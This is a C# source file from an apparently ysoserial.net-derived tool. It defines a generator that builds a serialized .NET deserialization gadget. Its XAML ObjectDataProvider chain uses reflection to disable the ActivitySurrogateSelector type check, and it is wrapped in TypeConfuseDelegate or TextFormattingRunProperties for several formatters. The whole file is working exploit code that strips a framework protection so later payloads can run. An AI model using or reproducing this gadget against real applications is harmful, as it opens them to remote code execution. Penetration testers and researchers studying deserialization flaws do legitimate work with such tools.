using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class ActivitySurrogateDisableTypeCheckGenerator : GenericGenerator
    {
        // Discovery facets (category search only): does not run a user command; it
        // flips a config flag to disable ActivitySurrogateSelector's type check. That
        // known result fits no broad family, so kind is "other". Uses WPF and
        // framework types. Variant 2 (TextFormattingRunProperties) additionally needs
        // Microsoft.PowerShell.Editor (declared as a variant override below).
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Other)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework);
        }

        public override string AdditionalInfo()
        {
            return "Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Ignored;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 wraps the XAML in TypeConfuseDelegate, whose gadget object
                // is a generic SortedSet<string>. SoapFormatter cannot serialize a
                // generic type, so this variant opts out of SoapFormatter (variant 2,
                // TextFormattingRunProperties, is not generic and serializes fine).
                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)").Without(Formatters.SoapFormatter),
                new GadgetVariant(2, "TextFormattingRunProperties wrapper")
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Other)
                        .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf,
                            GadgetRequirement.NetFramework))
            };
        }

        public override string Finders()
        {
            return "Nick Landers";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Variant };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        int variant_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject an impossible variant+formatter pair (e.g. variant 1 + SoapFormatter)
            // with a clear message instead of a deep framework exception.
            GuardVariantFormatter(variant_number, formatter);

            string xaml_payload = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:c=""clr-namespace:System.Configuration;assembly=System.Configuration""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
    <ObjectDataProvider x:Key=""type"" ObjectType=""{x:Type s:Type}"" MethodName=""GetType"">
        <ObjectDataProvider.MethodParameters>
            <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""field"" ObjectInstance=""{StaticResource type}"" MethodName=""GetField"">
        <ObjectDataProvider.MethodParameters>
            <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
            <r:BindingFlags>40</r:BindingFlags>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""set"" ObjectInstance=""{StaticResource field}"" MethodName=""SetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Object/>
            <s:Boolean>true</s:Boolean>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{x:Static c:ConfigurationManager.AppSettings}"" MethodName =""Set"">
        <ObjectDataProvider.MethodParameters>
            <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
            <s:String>true</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (inputArgs.Minify)
            {
                xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
            }

            object payload;
            if (variant_number == 1)
            {
                // TypeConfuseDelegate wrapper: a generic SortedSet<string> (see
                // GetXamlGadget), so SoapFormatter is opted out for this variant above.
                payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload);
            }
            else
            {
                payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            }

            return Serialize(payload, formatter, inputArgs);
        }

    }
}
